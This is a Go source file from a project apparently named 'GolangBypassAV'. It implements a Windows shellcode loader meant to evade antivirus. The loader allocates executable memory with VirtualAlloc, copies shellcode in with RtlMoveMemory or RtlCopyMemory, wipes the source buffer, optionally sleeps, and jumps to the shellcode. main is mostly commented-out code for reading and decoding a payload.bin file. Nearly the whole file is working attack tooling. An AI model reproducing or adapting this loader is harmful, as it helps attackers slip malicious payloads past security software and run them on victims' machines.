package main

import (
	"GolangBypassAV/encry"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
	RtlMoveMemory      = ntdll.MustFindProc("RtlMoveMemory")
)

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func genEXE(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}

	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkErr(err)

	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}

func genEXE1(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(5 * time.Second)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func getFileShellCode(file string) []byte {
	data := encry.ReadFile(file)
	//shellCodeHex := encry.GetBase64Data(data)
	//fmt.Print(shellCodeHex)
	return data
}

/*func getFileShellCode1(file string) string {
	data := encry.ReadFile(file)
	shellCodeHex := encry.GetBase64Data(data)
	fmt.Print(shellCodeHex)
	return shellCodeHex
}*/

func main() {
	//file := "C:\\Users\\Administrator\\Desktop\\payload.bin"
	//file1 := "C:\\Users\\Administrator\\Desktop\\test.txt"

	//s:= encry.GetBase64Data1(getFileShellCode(file))
	//print(s)
	//encry.GetCode1(s)

	/*	*/

	//bbdata := encry.GetBase64Data([]byte(bdata))

	//bbdata :="dfdf"
	/*	shellCodeHex := encry.GetShellCode(encry.GetBase64Data(encry.GetCode1(bbdata)))
		fmt.Print(shellCodeHex)
		genEXE(shellCodeHex)*/

	//fmt.Print(encry.EE("ba`gfe"))

}
